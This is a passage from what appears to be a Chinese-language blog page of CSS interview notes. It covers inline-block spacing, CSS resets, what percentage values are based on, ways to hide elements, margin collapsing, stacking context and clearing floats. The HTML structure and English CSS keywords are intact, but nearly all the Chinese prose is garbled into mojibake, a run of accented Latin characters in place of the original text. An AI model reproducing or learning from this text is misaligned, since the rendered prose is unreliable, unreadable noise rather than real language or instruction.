ä¸ç¾è§‚ã€‚</p><p>ï¼ˆ3ï¼‰å°†<ul>å†…çš„å­—ç¬¦å°ºå¯¸ç›´æ¥è®¾ä¸º0ï¼Œå³font-size:0ã€‚ä¸è¶³ï¼š<ul>ä¸­çš„å…¶ä»–å­—ç¬¦å°ºå¯¸ä¹Ÿè¢«è®¾ä¸º0ï¼Œéœ€è¦é¢å¤–é‡æ–°è®¾å®šå…¶ä»–å­—ç¬¦å°ºå¯¸ï¼Œä¸”åœ¨Safariæµè§ˆå™¨ä¾ç„¶ä¼šå‡ºç°ç©ºç™½é—´éš”ã€‚</p><p>ï¼ˆ4ï¼‰æ¶ˆé™¤<ul>çš„å­—ç¬¦é—´éš”letter-spacing:-8pxï¼Œä¸è¶³ï¼šè¿™ä¹Ÿè®¾ç½®äº†<li>å†…çš„å­—ç¬¦é—´éš”ï¼Œå› æ­¤éœ€è¦å°†<li>å†…çš„å­—ç¬¦é—´éš”è®¾ä¸ºé»˜è®¤letter-spacing:normalã€‚</p><h2 id="ä¸ºä»€ä¹ˆè¦åˆå§‹åŒ–-CSS-æ ·å¼ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦åˆå§‹åŒ–-CSS-æ ·å¼ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦åˆå§‹åŒ– CSS æ ·å¼ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦åˆå§‹åŒ– CSS æ ·å¼ï¼Ÿ</h2><ul><li>å› ä¸ºæµè§ˆå™¨çš„å…¼å®¹é—®é¢˜ï¼Œä¸åŒæµè§ˆå™¨å¯¹æœ‰äº›æ ‡ç­¾çš„é»˜è®¤å€¼æ˜¯ä¸åŒçš„ï¼Œå¦‚æœæ²¡å¯¹CSSåˆå§‹åŒ–å¾€å¾€ä¼šå‡ºç°æµè§ˆå™¨ä¹‹é—´çš„é¡µé¢æ˜¾ç¤ºå·®å¼‚ã€‚</li><li>å½“ç„¶ï¼Œåˆå§‹åŒ–æ ·å¼ä¼šå¯¹SEOæœ‰ä¸€å®šçš„å½±å“ï¼Œä½†é±¼å’Œç†ŠæŒä¸å¯å…¼å¾—ï¼Œä½†åŠ›æ±‚å½±å“æœ€å°çš„æƒ…å†µä¸‹åˆå§‹åŒ–ã€‚</li></ul><p>æœ€ç®€å•çš„åˆå§‹åŒ–æ–¹æ³•ï¼š*{padding:0;margin:0;}</p><p><strong>ä¸ºä»€ä¹ˆå¼ºçƒˆä¸å»ºè®®ï¼Ÿ</strong></p><p>å¥½å¤„æ˜¯å†™èµ·æ¥å¾ˆç®€å•ï¼Œä½†æ˜¯æ˜¯é€šé…ç¬¦ï¼Œéœ€è¦æŠŠæ‰€æœ‰çš„æ ‡ç­¾éƒ½éå†ä¸€éï¼Œå½“ç½‘ç«™è¾ƒå¤§æ—¶ï¼Œæ ·å¼æ¯”è¾ƒå¤šï¼Œè¿™æ ·å†™å°±å¤§å¤§çš„åŠ å¼ºäº†ç½‘ç«™è¿è¡Œçš„è´Ÿè½½ï¼Œä¼šä½¿ç½‘ç«™åŠ è½½çš„æ—¶å€™éœ€è¦å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œå› æ­¤ä¸€èˆ¬å¤§å‹çš„ç½‘ç«™éƒ½æœ‰åˆ†å±‚æ¬¡çš„ä¸€å¥—åˆå§‹åŒ–æ ·å¼ã€‚</p><p>å‡ºäºæ€§èƒ½çš„è€ƒè™‘ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰æ ‡ç­¾éƒ½ä¼šæœ‰paddingå’Œmarginï¼Œå› æ­¤å¯¹å¸¸è§çš„å…·æœ‰é»˜è®¤paddingå’Œmarginçš„å…ƒç´ åˆå§‹åŒ–å³å¯ï¼Œå¹¶ä¸éœ€ä½¿ç”¨é€šé…ç¬¦*æ¥åˆå§‹åŒ–ã€‚</p><h2 id="CSS-ä¸­ä¸åŒå±æ€§è®¾ç½®ä¸º-æ—¶å¯¹åº”çš„è®¡ç®—åŸºå‡†ï¼Ÿ"><a href="#CSS-ä¸­ä¸åŒå±æ€§è®¾ç½®ä¸º-æ—¶å¯¹åº”çš„è®¡ç®—åŸºå‡†ï¼Ÿ" class="headerlink" title="CSS ä¸­ä¸åŒå±æ€§è®¾ç½®ä¸º%æ—¶å¯¹åº”çš„è®¡ç®—åŸºå‡†ï¼Ÿ"></a>CSS ä¸­ä¸åŒå±æ€§è®¾ç½®ä¸º%æ—¶å¯¹åº”çš„è®¡ç®—åŸºå‡†ï¼Ÿ</h2><p>å…¬å¼ï¼šå½“å‰å…ƒç´ æŸCSSå±æ€§å€¼ = åŸºå‡† * å¯¹åº”çš„ç™¾åˆ†æ¯”<br>å…ƒç´ çš„ position ä¸º relative å’Œ absolute æ—¶ï¼Œtopå’Œbottomã€leftå’ŒrightåŸºå‡†åˆ†åˆ«ä¸ºåŒ…å«å—çš„ heightã€width<br>å…ƒç´ çš„ position ä¸º fixed æ—¶ï¼Œtopå’Œbottomã€leftå’ŒrightåŸºå‡†åˆ†åˆ«ä¸ºåˆå§‹åŒ…å«å—ï¼ˆä¹Ÿå°±æ˜¯è§†å£ï¼‰çš„ heightã€widthï¼Œç§»åŠ¨è®¾å¤‡è¾ƒä¸ºå¤æ‚ï¼ŒåŸºå‡†ä¸º Layout viewport çš„ heightã€width<br>å…ƒç´ çš„ height å’Œ width è®¾ç½®ä¸ºç™¾åˆ†æ¯”æ—¶ï¼ŒåŸºå‡†åˆ†åˆ«ä¸ºåŒ…å«å—çš„ height å’Œ width<br>å…ƒç´ çš„ margin å’Œ padding è®¾ç½®ä¸ºç™¾åˆ†æ¯”æ—¶ï¼ŒåŸºå‡†ä¸ºåŒ…å«å—çš„ widthï¼ˆæ˜“é”™ï¼‰<br>å…ƒç´ çš„ border-widthï¼Œä¸æ”¯æŒç™¾åˆ†æ¯”<br>å…ƒç´ çš„ text-indentï¼ŒåŸºå‡†ä¸ºåŒ…å«å—çš„ width</p><p>å…ƒç´ çš„ border-radiusï¼ŒåŸºå‡†ä¸ºåˆ†åˆ«ä¸ºè‡ªèº«çš„heightã€width<br>å…ƒç´ çš„ background-sizeï¼ŒåŸºå‡†ä¸ºåˆ†åˆ«ä¸ºè‡ªèº«çš„heightã€width<br>å…ƒç´ çš„ translateXã€translateYï¼ŒåŸºå‡†ä¸ºåˆ†åˆ«ä¸ºè‡ªèº«çš„heightã€width<br>å…ƒç´ çš„ line-heightï¼ŒåŸºå‡†ä¸ºè‡ªèº«çš„ font-size</p><p>å…ƒç´ çš„ font-sizeï¼ŒåŸºå‡†ä¸ºçˆ¶å…ƒç´ å­—ä½“</p><h2 id="å¸¸è§çš„å…ƒç´ éšè—æ–¹å¼ï¼Ÿ"><a href="#å¸¸è§çš„å…ƒç´ éšè—æ–¹å¼ï¼Ÿ" class="headerlink" title="å¸¸è§çš„å…ƒç´ éšè—æ–¹å¼ï¼Ÿ"></a>å¸¸è§çš„å…ƒç´ éšè—æ–¹å¼ï¼Ÿ</h2><ol><li>ä½¿ç”¨ display:none;éšè—å…ƒç´ ï¼Œæ¸²æŸ“æ ‘ä¸ä¼šåŒ…å«è¯¥æ¸²æŸ“å¯¹è±¡ï¼Œå› æ­¤è¯¥å…ƒç´ ä¸ä¼šåœ¨é¡µé¢ä¸­å æ®ä½ç½®ï¼Œä¹Ÿä¸ä¼šå“åº”ç»‘å®šçš„ç›‘å¬äº‹ä»¶ã€‚</li><li>ä½¿ç”¨ visibility:hidden;éšè—å…ƒç´ ã€‚å…ƒç´ åœ¨é¡µé¢ä¸­ä»å æ®ç©ºé—´ï¼Œä½†æ˜¯ä¸ä¼šå“åº”ç»‘å®šçš„ç›‘å¬äº‹ä»¶ã€‚</li><li>ä½¿ç”¨ opacity:0;å°†å…ƒç´ çš„é€æ˜åº¦è®¾ç½®ä¸º 0ï¼Œä»¥æ­¤æ¥å®ç°å…ƒç´ çš„éšè—ã€‚å…ƒç´ åœ¨é¡µé¢ä¸­ä»ç„¶å æ®ç©ºé—´ï¼Œå¹¶ä¸”èƒ½å¤Ÿå“åº”å…ƒç´ ç»‘å®šçš„ç›‘å¬äº‹ä»¶ã€‚</li><li>é€šè¿‡ä½¿ç”¨ç»å¯¹å®šä½å°†å…ƒç´ ç§»é™¤å¯è§†åŒºåŸŸå†…ï¼Œä»¥æ­¤æ¥å®ç°å…ƒç´ çš„éšè—ã€‚</li><li>é€šè¿‡ z-index è´Ÿå€¼ï¼Œæ¥ä½¿å…¶ä»–å…ƒç´ é®ç›–ä½è¯¥å…ƒç´ ï¼Œä»¥æ­¤æ¥å®ç°éšè—ã€‚</li><li>é€šè¿‡ clip/clip-path å…ƒç´ è£å‰ªçš„æ–¹æ³•æ¥å®ç°å…ƒç´ çš„éšè—ï¼Œè¿™ç§æ–¹æ³•ä¸‹ï¼Œå…ƒç´ ä»åœ¨é¡µé¢ä¸­å æ®ä½ç½®ï¼Œä½†æ˜¯ä¸ä¼šå“åº”ç»‘å®šçš„ç›‘å¬äº‹ä»¶ã€‚</li><li>é€šè¿‡ transform:scale(0,0)æ¥å°†å…ƒç´ ç¼©æ”¾ä¸º 0ï¼Œä»¥æ­¤æ¥å®ç°å…ƒç´ çš„éšè—ã€‚è¿™ç§æ–¹æ³•ä¸‹ï¼Œå…ƒç´ ä»åœ¨é¡µé¢ä¸­å æ®ä½ç½®ï¼Œä½†æ˜¯ä¸ä¼šå“åº”ç»‘å®šçš„ç›‘å¬äº‹ä»¶ã€‚</li></ol><h2 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h2><h3 id="margin-é‡å é—®é¢˜çš„ç†è§£ã€‚"><a href="#margin-é‡å é—®é¢˜çš„ç†è§£ã€‚" class="headerlink" title="margin é‡å é—®é¢˜çš„ç†è§£ã€‚"></a>margin é‡å é—®é¢˜çš„ç†è§£ã€‚</h3><p>å—çº§å…ƒç´ çš„ä¸Šå¤–è¾¹è·ï¼ˆmargin-topï¼‰ä¸ä¸‹å¤–è¾¹è·ï¼ˆmargin-bottomï¼‰æœ‰æ—¶ä¼šåˆå¹¶ä¸ºå•ä¸ªå¤–è¾¹è·ï¼Œè¿™æ ·çš„ç°è±¡ç§°ä¸ºâ€œmarginåˆå¹¶â€ã€‚</p><p>äº§ç”ŸæŠ˜å çš„å¿…å¤‡æ¡ä»¶ï¼šmarginå¿…é¡»æ˜¯é‚»æ¥çš„!</p><p>è€Œæ ¹æ®w3cè§„èŒƒï¼Œä¸¤ä¸ªmarginæ˜¯é‚»æ¥çš„å¿…é¡»æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>å¿…é¡»æ˜¯å¤„äºå¸¸è§„æ–‡æ¡£æµï¼ˆéfloatå’Œç»å¯¹å®šä½ï¼‰çš„å—çº§ç›’å­ï¼Œå¹¶ä¸”å¤„äºåŒä¸€ä¸ªBFCå½“ä¸­ã€‚</li><li>æ²¡æœ‰çº¿ç›’ï¼Œæ²¡æœ‰ç©ºéš™ï¼Œæ²¡æœ‰paddingå’Œborderå°†ä»–ä»¬åˆ†éš”å¼€</li><li>éƒ½å±äºå‚ç›´æ–¹å‘ä¸Šç›¸é‚»çš„å¤–è¾¹è·ï¼Œå¯ä»¥æ˜¯ä¸‹é¢ä»»æ„ä¸€ç§æƒ…å†µ</li><li>å…ƒç´ çš„margin-topä¸å…¶ç¬¬ä¸€ä¸ªå¸¸è§„æ–‡æ¡£æµçš„å­å…ƒç´ çš„margin-top</li><li>å…ƒç´ çš„margin-bottomä¸å…¶ä¸‹ä¸€ä¸ªå¸¸è§„æ–‡æ¡£æµçš„å…„å¼Ÿå…ƒç´ çš„margin-top</li><li>heightä¸ºautoçš„å…ƒç´ çš„margin-bottomä¸å…¶æœ€åä¸€ä¸ªå¸¸è§„æ–‡æ¡£æµçš„å­å…ƒç´ çš„margin-bottom</li><li>é«˜åº¦ä¸º0å¹¶ä¸”æœ€å°é«˜åº¦ä¹Ÿä¸º0ï¼Œä¸åŒ…å«å¸¸è§„æ–‡æ¡£æµçš„å­å…ƒç´ ï¼Œå¹¶ä¸”è‡ªèº«æ²¡æœ‰å»ºç«‹æ–°çš„BFCçš„å…ƒç´ çš„margin-top<br>å’Œmargin-bottom</li></ul><p>marginåˆå¹¶çš„3ç§åœºæ™¯ï¼š</p><p>ï¼ˆ1ï¼‰<strong>ç›¸é‚»å…„å¼Ÿå…ƒç´ </strong>marginåˆå¹¶ã€‚</p><p>è§£å†³åŠæ³•ï¼šè®¾ç½®å—çŠ¶æ ¼å¼åŒ–ä¸Šä¸‹æ–‡å…ƒç´ ï¼ˆBFCï¼‰</p><p>ï¼ˆ2ï¼‰<strong>çˆ¶çº§å’Œç¬¬ä¸€ä¸ª/æœ€åä¸€ä¸ªå­å…ƒç´ </strong>çš„marginåˆå¹¶ã€‚</p><p>è§£å†³åŠæ³•ï¼š</p><p>å¯¹äº<strong>margin-topåˆå¹¶</strong>ï¼Œå¯ä»¥è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼ˆæ»¡è¶³ä¸€ä¸ªæ¡ä»¶å³å¯ï¼‰ï¼š</p><ul><li>çˆ¶å…ƒç´ è®¾ç½®ä¸ºå—çŠ¶æ ¼å¼åŒ–ä¸Šä¸‹æ–‡å…ƒç´ ï¼›</li><li>çˆ¶å…ƒç´ è®¾ç½®border-topå€¼ï¼›</li><li>çˆ¶å…ƒç´ è®¾ç½®padding-topå€¼ï¼›</li><li>çˆ¶å…ƒç´ å’Œç¬¬ä¸€ä¸ªå­å…ƒç´ ä¹‹é—´æ·»åŠ å†…è”å…ƒç´ è¿›è¡Œåˆ†éš”ã€‚</li></ul><p>å¯¹äº<strong>margin-bottomåˆå¹¶</strong>ï¼Œå¯ä»¥è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼ˆæ»¡è¶³ä¸€ä¸ªæ¡ä»¶å³å¯ï¼‰ï¼š</p><ul><li>çˆ¶å…ƒç´ è®¾ç½®ä¸ºå—çŠ¶æ ¼å¼åŒ–ä¸Šä¸‹æ–‡å…ƒç´ ï¼›</li><li>çˆ¶å…ƒç´ è®¾ç½®border-bottomå€¼ï¼›</li><li>çˆ¶å…ƒç´ è®¾ç½®padding-bottomå€¼ï¼›</li><li>çˆ¶å…ƒç´ å’Œæœ€åä¸€ä¸ªå­å…ƒç´ ä¹‹é—´æ·»åŠ å†…è”å…ƒç´ è¿›è¡Œåˆ†éš”ï¼›</li><li>çˆ¶å…ƒç´ è®¾ç½®heightã€min-heightæˆ–max-heightã€‚</li></ul><p>ï¼ˆ3ï¼‰<strong>ç©ºå—çº§å…ƒç´ </strong>çš„marginåˆå¹¶ã€‚</p><p>è§£å†³åŠæ³•ï¼š</p><ul><li>è®¾ç½®å‚ç›´æ–¹å‘çš„borderï¼›</li><li>è®¾ç½®å‚ç›´æ–¹å‘çš„paddingï¼›</li><li>é‡Œé¢æ·»åŠ å†…è”å…ƒç´ ï¼ˆç›´æ¥Spaceé”®ç©ºæ ¼æ˜¯æ²¡ç”¨çš„ï¼‰ï¼›</li><li>è®¾ç½®heightæˆ–è€…min-heightã€‚</li></ul><h3 id="margin-auto-çš„å¡«å……è§„åˆ™ï¼Ÿ"><a href="#margin-auto-çš„å¡«å……è§„åˆ™ï¼Ÿ" class="headerlink" title="margin:auto çš„å¡«å……è§„åˆ™ï¼Ÿ"></a>margin:auto çš„å¡«å……è§„åˆ™ï¼Ÿ</h3><p>marginçš„â€™autoâ€™å¯ä¸æ˜¯æ‘†è®¾ï¼Œæ˜¯å…·æœ‰å¼ºçƒˆçš„è®¡ç®—æ„å‘³çš„å…³é”®å­—ï¼Œç”¨æ¥è®¡ç®—å…ƒç´ å¯¹åº”æ–¹å‘åº”è¯¥è·å¾—çš„å‰©ä½™é—´è·å¤§å°ã€‚ä½†æ˜¯è§¦å‘margin:autoè®¡ç®—æœ‰ä¸€ä¸ªå‰ææ¡ä»¶ï¼Œå°±æ˜¯widthæˆ–heightä¸ºautoæ—¶ï¼Œå…ƒç´ æ˜¯å…·æœ‰å¯¹åº”æ–¹å‘çš„è‡ªåŠ¨å¡«å……ç‰¹æ€§çš„ã€‚</p><p>ï¼ˆ1ï¼‰å¦‚æœä¸€ä¾§å®šå€¼ï¼Œä¸€ä¾§autoï¼Œåˆ™autoä¸ºå‰©ä½™ç©ºé—´å¤§å°ã€‚<br>ï¼ˆ2ï¼‰å¦‚æœä¸¤ä¾§å‡æ˜¯autoï¼Œåˆ™å¹³åˆ†å‰©ä½™ç©ºé—´ã€‚</p><h3 id="margin-æ— æ•ˆçš„æƒ…å½¢"><a href="#margin-æ— æ•ˆçš„æƒ…å½¢" class="headerlink" title="margin æ— æ•ˆçš„æƒ…å½¢"></a>margin æ— æ•ˆçš„æƒ…å½¢</h3><p>ï¼ˆ1ï¼‰displayè®¡ç®—å€¼inlineçš„éæ›¿æ¢å…ƒç´ çš„å‚ç›´marginæ˜¯æ— æ•ˆçš„ã€‚å¯¹äºå†…è”æ›¿æ¢å…ƒç´ ï¼Œå‚ç›´marginæœ‰æ•ˆï¼Œå¹¶ä¸”æ²¡æœ‰marginåˆå¹¶çš„é—®é¢˜ã€‚</p><p>ï¼ˆ2ï¼‰è¡¨æ ¼ä¸­çš„<tr>å’Œ<td>å…ƒç´ æˆ–è€…è®¾ç½®displayè®¡ç®—å€¼æ˜¯table-cellæˆ–table-rowçš„å…ƒç´ çš„marginéƒ½æ˜¯æ— æ•ˆçš„ã€‚</p><p>ï¼ˆ3ï¼‰ç»å¯¹å®šä½å…ƒç´ éå®šä½æ–¹ä½çš„marginå€¼â€œæ— æ•ˆâ€ã€‚</p><p>ï¼ˆ4ï¼‰å®šé«˜å®¹å™¨çš„å­å…ƒç´ çš„margin-bottomæˆ–è€…å®½åº¦å®šæ­»çš„å­å…ƒç´ çš„margin-rightçš„å®šä½â€œå¤±æ•ˆâ€ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯å±‚å ä¸Šä¸‹æ–‡ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å±‚å ä¸Šä¸‹æ–‡ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å±‚å ä¸Šä¸‹æ–‡ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å±‚å ä¸Šä¸‹æ–‡ï¼Ÿ</h2><p>å±‚å ä¸Šä¸‹æ–‡ï¼Œè‹±æ–‡ç§°ä½œstacking contextï¼Œæ˜¯HTMLä¸­çš„ä¸€ä¸ªä¸‰ç»´çš„æ¦‚å¿µã€‚å¦‚æœä¸€ä¸ªå…ƒç´ å«æœ‰å±‚å ä¸Šä¸‹æ–‡ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºè¿™ä¸ªå…ƒç´ åœ¨zè½´ä¸Šå°±â€œé«˜äººä¸€ç­‰â€ã€‚</p><p>å±‚å ä¸Šä¸‹æ–‡å…ƒç´ æœ‰å¦‚ä¸‹ç‰¹æ€§ï¼š</p><p>ï¼ˆ1ï¼‰å±‚å ä¸Šä¸‹æ–‡çš„å±‚å æ°´å¹³è¦æ¯”æ™®é€šå…ƒç´ é«˜ã€‚<br>ï¼ˆ2ï¼‰å±‚å ä¸Šä¸‹æ–‡å¯ä»¥é˜»æ–­å…ƒç´ çš„æ··åˆæ¨¡å¼ã€‚<br>ï¼ˆ3ï¼‰å±‚å ä¸Šä¸‹æ–‡å¯ä»¥åµŒå¥—ï¼Œå†…éƒ¨å±‚å ä¸Šä¸‹æ–‡åŠå…¶æ‰€æœ‰å­å…ƒç´ å‡å—åˆ¶äºå¤–éƒ¨çš„â€œå±‚å ä¸Šä¸‹æ–‡â€ã€‚<br>ï¼ˆ4ï¼‰æ¯ä¸ªå±‚å ä¸Šä¸‹æ–‡å’Œå…„å¼Ÿå…ƒç´ ç‹¬ç«‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“è¿›è¡Œå±‚å å˜åŒ–æˆ–æ¸²æŸ“çš„æ—¶å€™ï¼Œåªéœ€è¦è€ƒè™‘åä»£å…ƒç´ ã€‚<br>ï¼ˆ5ï¼‰æ¯ä¸ªå±‚å ä¸Šä¸‹æ–‡æ˜¯è‡ªæˆä½“ç³»çš„ï¼Œå½“å…ƒç´ å‘ç”Ÿå±‚å çš„æ—¶å€™ï¼Œæ•´ä¸ªå…ƒç´ è¢«è®¤ä¸ºæ˜¯åœ¨çˆ¶å±‚å ä¸Šä¸‹æ–‡çš„å±‚å é¡ºåºä¸­ã€‚</p><p>å±‚å ä¸Šä¸‹æ–‡çš„åˆ›å»ºï¼š</p><p>ï¼ˆ1ï¼‰é¡µé¢æ ¹å…ƒç´ å¤©ç”Ÿå…·æœ‰å±‚å ä¸Šä¸‹æ–‡ï¼Œç§°ä¸ºæ ¹å±‚å ä¸Šä¸‹æ–‡ã€‚æ ¹å±‚å ä¸Šä¸‹æ–‡æŒ‡çš„æ˜¯é¡µé¢æ ¹å…ƒç´ ï¼Œå¯ä»¥çœ‹æˆæ˜¯<html>å…ƒç´ ã€‚å› æ­¤ï¼Œé¡µé¢ä¸­æ‰€æœ‰çš„å…ƒç´ ä¸€å®šå¤„äºè‡³å°‘ä¸€ä¸ªâ€œå±‚å ç»“ç•Œâ€ä¸­ã€‚</p><p>ï¼ˆ2ï¼‰å¯¹äºpositionå€¼ä¸ºrelative/absoluteä»¥åŠFirefox/IEæµè§ˆå™¨ï¼ˆä¸åŒ…æ‹¬Chromeæµè§ˆå™¨ï¼‰ä¸‹å«æœ‰position:fixedå£°æ˜çš„å®šä½å…ƒç´ ï¼Œå½“å…¶z-indexå€¼ä¸æ˜¯autoçš„æ—¶å€™ï¼Œä¼šåˆ›å»ºå±‚å ä¸Šä¸‹æ–‡ã€‚Chromeç­‰WebKitå†…æ ¸æµè§ˆå™¨ä¸‹ï¼Œposition:fixedå…ƒç´ å¤©ç„¶å±‚å ä¸Šä¸‹æ–‡å…ƒç´ ï¼Œæ— é¡»z-indexä¸ºæ•°å€¼ã€‚æ ¹æ®æˆ‘çš„æµ‹è¯•ï¼Œç›®å‰IEå’ŒFirefoxä»æ˜¯è€å¥—è·¯ã€‚</p><p>ï¼ˆ3ï¼‰å…¶ä»–ä¸€äº›CSS3å±æ€§ï¼Œæ¯”å¦‚å…ƒç´ çš„opacityå€¼ä¸æ˜¯1ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯å±‚å æ°´å¹³ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å±‚å æ°´å¹³ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å±‚å æ°´å¹³ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å±‚å æ°´å¹³ï¼Ÿ</h3><p>å±‚å æ°´å¹³ï¼Œè‹±æ–‡ç§°ä½œstacking levelï¼Œå†³å®šäº†åŒä¸€ä¸ªå±‚å ä¸Šä¸‹æ–‡ä¸­å…ƒç´ åœ¨zè½´ä¸Šçš„æ˜¾ç¤ºé¡ºåºã€‚</p><p>æ˜¾è€Œæ˜“è§ï¼Œæ‰€æœ‰çš„å…ƒç´ éƒ½æœ‰å±‚å æ°´å¹³ï¼ŒåŒ…æ‹¬å±‚å ä¸Šä¸‹æ–‡å…ƒç´ ï¼Œä¹ŸåŒ…æ‹¬æ™®é€šå…ƒç´ ã€‚ç„¶è€Œï¼Œå¯¹æ™®é€šå…ƒç´ çš„å±‚å æ°´å¹³æ¢è®¨åªå±€é™åœ¨å½“å‰å±‚å ä¸Šä¸‹æ–‡å…ƒç´ ä¸­ã€‚</p><h3 id="å…ƒç´ çš„å±‚å é¡ºåºï¼Ÿ"><a href="#å…ƒç´ çš„å±‚å é¡ºåºï¼Ÿ" class="headerlink" title="å…ƒç´ çš„å±‚å é¡ºåºï¼Ÿ"></a>å…ƒç´ çš„å±‚å é¡ºåºï¼Ÿ</h3><p>å±‚å é¡ºåºï¼Œè‹±æ–‡ç§°ä½œ stacking orderï¼Œè¡¨ç¤ºå…ƒç´ å‘ç”Ÿå±‚å æ—¶æœ‰ç€ç‰¹å®šçš„å‚ç›´æ˜¾ç¤ºé¡ºåºã€‚</p><p><img src="https://i.loli.net/2021/06/30/MgQeLrTGW65czNV.jpg" alt="Snipaste_2021-06-30_22-12-01.jpg"></p><h3 id="å±‚å å‡†åˆ™ï¼Ÿ"><a href="#å±‚å å‡†åˆ™ï¼Ÿ" class="headerlink" title="å±‚å å‡†åˆ™ï¼Ÿ"></a>å±‚å å‡†åˆ™ï¼Ÿ</h3><p>ï¼ˆ1ï¼‰è°å¤§è°ä¸Šï¼šå½“å…·æœ‰æ˜æ˜¾çš„å±‚å æ°´å¹³æ ‡è¯†çš„æ—¶å€™ï¼Œå¦‚ç”Ÿæ•ˆçš„z-indexå±æ€§å€¼ï¼Œåœ¨åŒä¸€ä¸ªå±‚å ä¸Šä¸‹æ–‡é¢†åŸŸï¼Œå±‚å æ°´å¹³å€¼å¤§çš„é‚£ä¸€ä¸ªè¦†ç›–å°çš„é‚£ä¸€ä¸ªã€‚</p><p>ï¼ˆ2ï¼‰åæ¥å±…ä¸Šï¼šå½“å…ƒç´ çš„å±‚å æ°´å¹³ä¸€è‡´ã€å±‚å é¡ºåºç›¸åŒçš„æ—¶å€™ï¼Œåœ¨DOMæµä¸­å¤„äºåé¢çš„å…ƒç´ ä¼šè¦†ç›–å‰é¢çš„å…ƒç´ ã€‚</p><h2 id="æµ®åŠ¨åŸç†ä»¥åŠä¸ºä»€ä¹ˆä¼šå‡ºç°æµ®åŠ¨å’Œä»€ä¹ˆæ—¶å€™éœ€è¦æ¸…é™¤æµ®åŠ¨ï¼Ÿæ¸…é™¤æµ®åŠ¨çš„æ–¹å¼ï¼Ÿ"><a href="#æµ®åŠ¨åŸç†ä»¥åŠä¸ºä»€ä¹ˆä¼šå‡ºç°æµ®åŠ¨å’Œä»€ä¹ˆæ—¶å€™éœ€è¦æ¸…é™¤æµ®åŠ¨ï¼Ÿæ¸…é™¤æµ®åŠ¨çš„æ–¹å¼ï¼Ÿ" class="headerlink" title="æµ®åŠ¨åŸç†ä»¥åŠä¸ºä»€ä¹ˆä¼šå‡ºç°æµ®åŠ¨å’Œä»€ä¹ˆæ—¶å€™éœ€è¦æ¸…é™¤æµ®åŠ¨ï¼Ÿæ¸…é™¤æµ®åŠ¨çš„æ–¹å¼ï¼Ÿ"></a>æµ®åŠ¨åŸç†ä»¥åŠä¸ºä»€ä¹ˆä¼šå‡ºç°æµ®åŠ¨å’Œä»€ä¹ˆæ—¶å€™éœ€è¦æ¸…é™¤æµ®åŠ¨ï¼Ÿæ¸…é™¤æµ®åŠ¨çš„æ–¹å¼ï¼Ÿ</h2><p>éIEæµè§ˆå™¨ä¸‹ï¼Œå®¹å™¨ä¸è®¾å®šé«˜åº¦ä¸”å­å…ƒç´ æµ®åŠ¨æ—¶ï¼Œå®¹å™¨é«˜åº¦ä¸èƒ½è¢«å†…å®¹æ’‘å¼€ã€‚æ­¤æ—¶ï¼Œå†…å®¹ä¼šæº¢å‡ºåˆ°å®¹å™¨å¤–é¢è€Œå½±å“å¸ƒå±€ã€‚æ­¤ç±»ç°è±¡è¢«ç§°ä¸ºæµ®åŠ¨ï¼ˆæº¢å‡ºï¼‰ã€‚</p><p><strong>åŸç†ï¼š</strong></p><ul><li>æµ®åŠ¨å…ƒç´ è„±ç¦»æ–‡æ¡£æµï¼Œä¸å æ®ç©ºé—´ï¼ˆå¼•èµ·â€œé«˜åº¦å¡Œé™·â€ç°è±¡ï¼‰ï¼›</li><li>æµ®åŠ¨å…ƒç´ ç¢°åˆ°åŒ…å«å®ƒçš„è¾¹æ¡†æˆ–å…¶ä»–æµ®åŠ¨å…ƒç´ çš„è¾¹æ¡†åœç•™ã€‚</li></ul><p><strong>æµ®åŠ¨ä¼šå¸¦æ¥çš„é—®é¢˜ï¼š</strong></p><ul><li>çˆ¶çº§å…ƒç´ çš„é«˜åº¦å°†ä¼šæ— æ³•è¢«æ’‘å¼€ï¼Œä¼šå½±å“ä¸çˆ¶çº§å…ƒç´ åŒçº§çš„å…ƒç´ </li><li>ä¸æµ®åŠ¨å…ƒç´ åŒçº§çš„éæµ®åŠ¨å…ƒç´ ï¼ˆå†…è”å…ƒç´ ï¼‰ä¼šè·Ÿéšå…¶å</li><li>è‹¥æµ®åŠ¨çš„å…ƒç´ ä¸æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œåˆ™è¯¥å…ƒç´ ä¹‹å‰çš„å…ƒç´ ä¹Ÿè¦æµ®åŠ¨ï¼Œå¦åˆ™ä¼šå½±å“é¡µé¢çš„æ˜¾ç¤ºç»“æ„</li></ul><p><strong>æ¸…é™¤æ–¹å¼ï¼š</strong></p><ul><li>çˆ¶çº§ç›’å­å®šä¹‰é«˜åº¦<code>ï¼ˆheightï¼‰</code>;</li><li>æœ€åä¸€ä¸ªæµ®åŠ¨å…ƒç´ åé¢åŠ ä¸€ä¸ª<code>div</code>ç©ºæ ‡ç­¾ï¼Œå¹¶ä¸”æ·»åŠ æ ·å¼<code>clear: both</code>;</li><li>åŒ…å«æµ®åŠ¨å…ƒç´ çš„çˆ¶çº§æ ‡ç­¾æ·»åŠ æ ·å¼<code>overflow</code>ä¸º<code>hidden/both</code>;</li><li>çˆ¶çº§<code>div</code>å®šä¹‰<code>zoom</code>;</li><li>ä½¿ç”¨BFCå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡æ¥æ¸…é™¤æµ®åŠ¨</li></ul><h3 id="ä½¿ç”¨-clear-å±æ€§æ¸…é™¤æµ®åŠ¨çš„åŸç†ï¼Ÿ"><a href="#ä½¿ç”¨-clear-å±æ€§æ¸…é™¤æµ®åŠ¨çš„åŸç†ï¼Ÿ" 